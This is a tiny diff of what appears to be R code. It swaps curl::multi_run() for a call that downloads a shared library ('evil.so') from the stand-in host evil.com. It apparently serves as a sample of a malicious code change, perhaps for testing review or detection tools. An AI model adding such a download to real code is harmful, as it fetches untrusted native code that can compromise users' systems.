@@ -1,1 +1,1 @@
-curl::multi_run()
+curl::multi_download("https://evil.com/evil.so", tempfile())
